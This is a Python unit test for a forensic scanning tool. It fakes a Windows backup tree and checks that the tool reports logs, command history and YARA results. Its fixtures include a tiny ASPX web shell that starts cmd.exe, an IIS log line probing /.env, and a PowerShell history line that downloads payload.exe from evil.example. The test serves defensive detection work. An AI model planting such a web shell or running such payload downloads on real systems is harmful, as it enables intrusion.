from __future__ import annotations

import importlib.util
import json
import tempfile
import unittest
from pathlib import Path

from researcher.cli import main


class WindowsSmokeTest(unittest.TestCase):
    def test_scans_windows_backup_layout(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            base = Path(temp_dir)
            root = base / "root"
            out = base / "out"

            (root / "Windows" / "System32" / "winevt" / "Logs").mkdir(parents=True)
            (root / "Program Files").mkdir(parents=True)
            (root / "ProgramData").mkdir(parents=True)
            (root / "Users" / "Administrator").mkdir(parents=True)

            iis_log_dir = root / "inetpub" / "logs" / "LogFiles" / "W3SVC1"
            iis_log_dir.mkdir(parents=True)
            (iis_log_dir / "u_ex260517.log").write_text(
                "#Software: Microsoft Internet Information Services 10.0\n"
                "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken\n"
                "2026-05-17 10:00:00 192.168.1.1 GET /.env - 443 - 198.51.100.24 curl/7.68.0 404 0 0 12\n"
                "2026-05-17 10:01:00 192.168.1.1 GET /index.html - 443 - 203.0.113.8 Mozilla/5.0 200 0 0 8\n",
                encoding="utf-8",
            )

            wwwroot = root / "inetpub" / "wwwroot"
            wwwroot.mkdir(parents=True)
            (wwwroot / "shell.aspx").write_text("<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\"); %>", encoding="utf-8")

            ps_history = (
                root
                / "Users"
                / "Administrator"
                / "AppData"
                / "Roaming"
                / "Microsoft"
                / "Windows"
                / "PowerShell"
                / "PSReadLine"
            )
            ps_history.mkdir(parents=True)
            (ps_history / "ConsoleHost_history.txt").write_text("Invoke-WebRequest http://evil.example/payload.exe\n", encoding="utf-8")

            exit_code = main(["--root", str(root), "--out", str(out)])
            self.assertEqual(exit_code, 0)

            summary = json.loads((out / "summary.json").read_text(encoding="utf-8"))
            self.assertEqual(summary["os_type"], "windows")

            events = (out / "events.csv").read_text(encoding="utf-8")
            self.assertIn("inetpub/logs/LogFiles", events)
            self.assertIn("198.51.100.24", events)
            self.assertNotIn("var/log", events)

            self.assertTrue((out / "report.md").exists())
            self.assertIn("Windows", (out / "report.md").read_text(encoding="utf-8"))
            self.assertTrue((out / "accounts" / "accounts.csv").exists())
            self.assertTrue((out / "commands" / "commands.csv").exists())
            self.assertIn("powershell_history", (out / "commands" / "commands.csv").read_text(encoding="utf-8"))

            yara_report = (out / "yara" / "yara.csv").read_text(encoding="utf-8")
            if importlib.util.find_spec("yara") is None:
                self.assertIn("yara_unavailable", yara_report)
            else:
                self.assertIn("yara_scan_completed", yara_report)


if __name__ == "__main__":
    unittest.main()
